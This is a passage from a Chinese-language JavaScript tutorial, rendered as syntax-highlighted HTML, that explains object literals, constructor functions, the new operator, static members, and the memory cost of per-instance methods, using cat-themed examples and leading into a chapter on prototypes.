<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">gender</span>);             <span class="hljs-comment">// undefined</span>
</code></pre>
<h4 data-id="heading-8">2.4 对象字面量的优缺点分析</h4>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>简单直观</strong>：语法清晰，易于理解</li>
<li><strong>快速创建</strong>：不需要复杂的定义过程</li>
<li><strong>灵活修改</strong>：可以随时添加、修改、删除属性</li>
<li><strong>JSON兼容</strong>：JSON格式就是基于对象字面量</li>
</ul>
<p><strong>缺点</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 问题1：代码重复（创建多个相似对象时）</span>
<span class="hljs-keyword">const</span> cat1 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">"黄色"</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"吃鱼"</span>); }
};

<span class="hljs-keyword">const</span> cat2 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"小白猫"</span>,      <span class="hljs-comment">// 重复的属性定义</span>
    <span class="hljs-attr">color</span>: <span class="hljs-string">"白色"</span>,       <span class="hljs-comment">// 重复的属性定义  </span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,          <span class="hljs-comment">// 重复的属性定义</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"吃鱼"</span>); }  <span class="hljs-comment">// 重复的函数定义</span>
};

<span class="hljs-comment">// 问题2：类型关系不明确</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">constructor</span>);  <span class="hljs-comment">// Object，不是Cat</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1 <span class="hljs-keyword">instanceof</span> ?); <span class="hljs-comment">// 没有类型概念</span>

<span class="hljs-comment">// 问题3：方法重复创建，浪费内存</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>);  <span class="hljs-comment">// false，两个相同的函数</span>
</code></pre>
<h4 data-id="heading-9">2.5 适用场景</h4>
<p>对象字面量最适合以下情况：</p>
<ol>
<li><strong>配置对象</strong>：一次性使用的设置</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">apiUrl</span>: <span class="hljs-string">"https://api.example.com"</span>,
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>,
    <span class="hljs-attr">retryTimes</span>: <span class="hljs-number">3</span>,
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
    }
};
</code></pre>
<ol start="2">
<li><strong>数据容器</strong>：临时存储数据</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> formData = {
    <span class="hljs-attr">username</span>: <span class="hljs-string">"john_doe"</span>,
    <span class="hljs-attr">email</span>: <span class="hljs-string">"john@example.com"</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
    <span class="hljs-attr">interests</span>: [<span class="hljs-string">"编程"</span>, <span class="hljs-string">"游戏"</span>, <span class="hljs-string">"音乐"</span>]
};
</code></pre>
<ol start="3">
<li><strong>命名空间</strong>：组织相关功能</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MathUtils</span> = {
    <span class="hljs-attr">PI</span>: <span class="hljs-number">3.141592653589793</span>,
    
    <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">return</span> a + b;
    },
    
    <span class="hljs-attr">multiply</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">return</span> a * b;
    },
    
    <span class="hljs-attr">randomInt</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">min, max</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (max - min + <span class="hljs-number">1</span>)) + min;
    }
};

<span class="hljs-comment">// 使用命名空间</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-property">PI</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
</code></pre>
<ol start="4">
<li><strong>枚举值</strong>：定义常量</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Colors</span> = {
    <span class="hljs-attr">RED</span>: <span class="hljs-string">"#FF0000"</span>,
    <span class="hljs-attr">GREEN</span>: <span class="hljs-string">"#00FF00"</span>, 
    <span class="hljs-attr">BLUE</span>: <span class="hljs-string">"#0000FF"</span>,
    <span class="hljs-attr">WHITE</span>: <span class="hljs-string">"#FFFFFF"</span>,
    <span class="hljs-attr">BLACK</span>: <span class="hljs-string">"#000000"</span>
};

<span class="hljs-comment">// 使用枚举</span>
button.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">BLUE</span>;
</code></pre>
<h3 data-id="heading-10">第三章：构造函数模式——真正的"制造工厂"</h3>
<h4 data-id="heading-11">3.1 从手工制作到批量生产</h4>
<p>当我们发现需要创建很多相似对象时，对象字面量就显得效率低下了。这时，构造函数模式应运而生。</p>
<p><strong>现实比喻</strong>：</p>
<ul>
<li><strong>对象字面量</strong>：像手工雕刻，每只猫都要从头开始</li>
<li><strong>构造函数</strong>：像使用模具，一次设计，多次生产</li>
</ul>
<h4 data-id="heading-12">3.2 构造函数的基本用法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 定义一个猫的"模具"——构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// new Cat() 被调用时，发生以下事情：</span>
    <span class="hljs-comment">// 1. 创建一个新的空对象 {}</span>
    <span class="hljs-comment">// 2. this 指向这个新对象</span>
    <span class="hljs-comment">// 3. 执行构造函数内的代码</span>
    <span class="hljs-comment">// 4. 返回这个新对象（默认情况）</span>
    
    <span class="hljs-comment">// 给新对象添加属性</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;     <span class="hljs-comment">// this.name 就是新对象的.name</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;   <span class="hljs-comment">// this.color 就是新对象的.color</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;  <span class="hljs-comment">// 默认年龄为1</span>
    
    <span class="hljs-comment">// 给新对象添加方法</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"要睡"</span> + hours + <span class="hljs-string">"小时"</span>);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">getInfo</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"是一只"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> + <span class="hljs-string">"岁的"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> + <span class="hljs-string">"猫"</span>;
    };
}

<span class="hljs-comment">// 使用构造函数创建实例（用模具生产）</span>
<span class="hljs-keyword">const</span> garfield = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> doraemon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"哆啦A梦"</span>, <span class="hljs-string">"蓝色"</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 机器猫，年龄为0</span>
<span class="hljs-keyword">const</span> helloKitty = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"凯蒂猫"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-number">10</span>);

<span class="hljs-comment">// 使用这些猫</span>
garfield.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"意大利面"</span>);        <span class="hljs-comment">// 输出：加菲猫在吃意大利面</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(doraemon.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// 输出：哆啦A梦是一只0岁的蓝色猫</span>
helloKitty.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">12</span>);           <span class="hljs-comment">// 输出：凯蒂猫要睡12小时</span>
</code></pre>
<h4 data-id="heading-13">3.3 深入理解 <code>new</code> 关键字</h4>
<p><code>new</code> 操作符是构造函数模式的核心，它背后做了很多工作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 手动模拟 new 操作符的工作</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">customNew</span>(<span class="hljs-params">constructor, ...args</span>) {
    <span class="hljs-comment">// 1. 创建一个空对象</span>
    <span class="hljs-keyword">const</span> obj = {};
    
    <span class="hljs-comment">// 2. 设置原型链：新对象的__proto__指向构造函数的prototype</span>
    obj.<span class="hljs-property">__proto__</span> = constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
    
    <span class="hljs-comment">// 3. 绑定this并执行构造函数</span>
    <span class="hljs-keyword">const</span> result = constructor.<span class="hljs-title function_">apply</span>(obj, args);
    
    <span class="hljs-comment">// 4. 确保返回一个对象</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> ? result : obj;
}

<span class="hljs-comment">// 使用自定义的new</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-title function_">customNew</span>(<span class="hljs-title class_">Cat</span>, <span class="hljs-string">"咪咪"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span>);  <span class="hljs-comment">// "咪咪"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-14">3.4 构造函数的重要特性</h4>
<h5 data-id="heading-15">1. <code>constructor</code> 属性</h5>
<p>每个通过构造函数创建的对象都有一个 <code>constructor</code> 属性，指向创建它的构造函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span>);           <span class="hljs-comment">// 输出：function Cat(name) {...}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>);   <span class="hljs-comment">// 输出：true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);        <span class="hljs-comment">// 输出：true</span>

<span class="hljs-comment">// 通过constructor创建新对象</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> cat.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"小黑"</span></span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出：小黑</span>
</code></pre>
<h5 data-id="heading-16">2. 构造函数返回值</h5>
<p>构造函数可以有返回值，但会影响 <code>new</code> 的行为：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    
    <span class="hljs-comment">// 情况1：返回基本类型（被忽略）</span>
    <span class="hljs-comment">// return 123;      // 忽略，仍然返回this</span>
    <span class="hljs-comment">// return "hello";  // 忽略，仍然返回this</span>
    
    <span class="hljs-comment">// 情况2：返回对象（替代新对象）</span>
    <span class="hljs-comment">// return { custom: "对象" };  // 返回这个对象，而不是this</span>
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出：咪咪</span>
</code></pre>
<h5 data-id="heading-17">3. 静态属性和方法</h5>
<p>构造函数本身也是对象，可以有自己的属性和方法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 静态属性：属于构造函数本身，不属于实例</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫科动物"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span> = <span class="hljs-number">0</span>;

<span class="hljs-comment">// 静态方法：通过构造函数调用，不是实例调用</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">createFromJSON</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">jsonString</span>) {
    <span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span>++;  <span class="hljs-comment">// 创建时计数</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(data.<span class="hljs-property">name</span>, data.<span class="hljs-property">color</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property">getTotalCats</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span>;
};

<span class="hljs-comment">// 使用静态成员</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property">species</span>);  <span class="hljs-comment">// 猫科动物</span>

<span class="hljs-keyword">const</span> jsonStr = <span class="hljs-string">'{"name":"小黄","color":"黄色"}'</span>;
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">createFromJSON</span>(jsonStr);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">name</span>);       <span class="hljs-comment">// 小黄</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">getTotalCats</span>()); <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// 静态方法不能通过实例调用</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"小白"</span>, <span class="hljs-string">"白色"</span>);
<span class="hljs-comment">// cat2.getTotalCats();  // 错误：不是函数</span>
</code></pre>
<h4 data-id="heading-18">3.5 构造函数模式的内存问题</h4>
<p>构造函数模式有一个严重的缺陷：<strong>方法重复创建</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    
    <span class="hljs-comment">// 问题：每次new Cat()都会创建新的函数对象</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    };
}

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫1"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫2"</span>);
<span class="hljs-keyword">const</span> cat3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫3"</span>);

<span class="hljs-comment">// 每个实例都有自己独立的eat和sleep方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>);      <span class="hljs-comment">// false，不是同一个函数</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">sleep</span> === cat3.<span class="hljs-property">sleep</span>);  <span class="hljs-comment">// false，不是同一个函数</span>

<span class="hljs-comment">// 内存浪费示意图：</span>
<span class="hljs-comment">// cat1 → {name, eat函数1, sleep函数1}</span>
<span class="hljs-comment">// cat2 → {name, eat函数2, sleep函数2}  </span>
<span class="hljs-comment">// cat3 → {name, eat函数3, sleep函数3}</span>
<span class="hljs-comment">// 每个函数都是独立的，占用独立的内存空间</span>

<span class="hljs-comment">// 创建100只猫，就有100个eat函数和100个sleep函数！</span>
<span class="hljs-comment">// 实际功能完全一样，这是巨大的内存浪费</span>
</code></pre>
<h4 data-id="heading-19">3.6 防御性编程：防止忘记 <code>new</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方案1：使用严格模式 + 检查</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// 严格模式下，this在普通调用时为undefined</span>
    <span class="hljs-string">"use strict"</span>;
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">undefined</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Cat构造函数必须使用new调用"</span>);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 方案2：自动纠正</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// 如果this不是Cat的实例（说明没有用new调用）</span>
    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>)) {
        <span class="hljs-comment">// 自动调用new</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(name);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 方案3：ES6 new.target</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// new.target在new调用时指向构造函数，否则为undefined</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span> !== <span class="hljs-title class_">Cat</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"必须使用new调用Cat构造函数"</span>);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"正确"</span>);  <span class="hljs-comment">// 正常</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"也正确"</span>);    <span class="hljs-comment">// 自动纠正方案中正常，其他方案报错</span>
</code></pre>
<h4 data-id="heading-20">3.7 构造函数的实际应用场景</h4>
<h5 data-id="heading-21">1. 创建UI组件</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">text, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span> = text;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"button"</span>);
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-property">textContent</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>;
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onClick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">handler</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, handler);
    };
}

<span class="hljs-keyword">const</span> submitBtn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">"提交"</span>, <span class="hljs-string">"blue"</span>);
<span class="hljs-keyword">const</span> cancelBtn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">"取消"</span>, <span class="hljs-string">"gray"</span>);

<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(submitBtn.<span class="hljs-title function_">render</span>());
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(cancelBtn.<span class="hljs-title function_">render</span>());
</code></pre>
<h5 data-id="heading-22">2. 数据模型</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">id, name, email</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">email</span> = email;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isActive</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deactivate</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isActive</span> = <span class="hljs-literal">false</span>;
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">getInfo</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.email}</span>) - <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.isActive ? <span class="hljs-string">'活跃'</span> : <span class="hljs-string">'非活跃'</span>}</span>`</span>;
    };
}

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"zhang@example.com"</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"li@example.com"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-title function_">getInfo</span>());
user2.<span class="hljs-title function_">deactivate</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user2.<span class="hljs-title function_">getInfo</span>());
</code></pre>
<h4 data-id="heading-23">3.8 构造函数模式的优缺点总结</h4>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>类型标识</strong>：实例有明确的constructor属性</li>
<li><strong>代码复用</strong>：可以批量创建相似对象</li>
<li><strong>封装性</strong>：将创建逻辑封装在函数中</li>
<li><strong>灵活性</strong>：可以传参定制每个实例</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li><strong>内存浪费</strong>：方法在每个实例中重复创建</li>
<li><strong>性能问题</strong>：大量实例时占用大量内存</li>
<li><strong>忘记new的风险</strong>：可能导致意外创建全局变量</li>
</ul>
<p>为了解决内存浪费的问题，我们需要更高级的模式——原型模式。</p>
<h2 data-id="heading-24">第四章：原型模式——JavaScript面向对象的精髓</h2>
<h3 data-id="heading-25">4.1 从构造函数的问题到原型的解决方案</h3>
<h4 data-id="heading-26">问题的根源：内存浪费的数学计算</h4>
<p>让我们先量化构造函数模式的内存问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">play</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在玩耍"</span>);
    };
    <span class="hljs-comment">// 假设每个方法平均占用1KB内存</span>
}

<span class="hljs-comment">// 创建1000只猫</span>
<span class="hljs-keyword">let</span> totalMemory = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">`猫<span class="hljs-subst">${i}</span>`</span>);
    <span class="hljs-comment">// 每只猫有3个方法，每个方法1KB</span>
    totalMemory += <span class="hljs-number">3</span>; <span class="hljs-comment">// KB</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`总内存占用: <span class="hljs-subst">${totalMemory}</span>KB = <span class="hljs-subst">${totalMemory / <span class="hljs-number">1024</span>}</span>MB`</span>);
<span class="hljs-comment">// 输出：总内存占用: 3000KB = 2.93MB</span>

